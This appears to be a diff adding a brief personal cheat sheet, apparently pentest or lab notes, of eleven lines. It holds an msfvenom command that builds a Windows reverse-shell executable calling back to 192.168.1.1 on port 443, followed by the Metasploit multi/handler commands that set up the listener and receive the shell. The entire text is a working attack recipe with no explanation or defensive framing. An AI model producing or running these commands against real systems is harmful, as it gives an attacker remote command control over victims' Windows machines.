@@ -1,0 +1,11 @@
+:make a exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+:setup lisener
+msfconsole
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+show options
+set lport 443
+set lhost 192.168.1.1
+show options
+exploit
